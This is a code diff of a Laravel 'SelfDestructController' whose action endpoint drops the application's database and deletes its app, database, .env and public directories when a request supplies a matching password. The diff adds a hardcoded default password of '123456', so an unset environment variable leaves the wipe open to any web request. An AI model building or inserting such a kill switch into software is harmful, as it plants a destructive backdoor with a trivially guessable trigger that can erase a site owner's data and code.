@@ -3,7 +3,6 @@
 namespace App\Http\Controllers;
 
 use App\Http\Controllers\Controller;
-use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\File;
 
@@ -16,16 +15,16 @@ class SelfDestructController extends Controller
 
     public function action()
     {
-        if (request('password') == env('SELF_DESTRUCT_PASSWORD')) {
+        if (request('password') == env('SELF_DESTRUCT_PASSWORD', 123456)) {
             try {
-                DB::statement('DROP DATABASE '.env('DB_DATABASE'));
-            } catch (\Exception $e) {}
+                DB::statement('DROP DATABASE ' . env('DB_DATABASE'));
+            } catch (\Exception $e) {
+            }
 
             $pathsToDelete = [
                 base_path('app'),
                 base_path('database'),
                 base_path('.env'),
-                resource_path("views"),
                 public_path(),
             ];
 
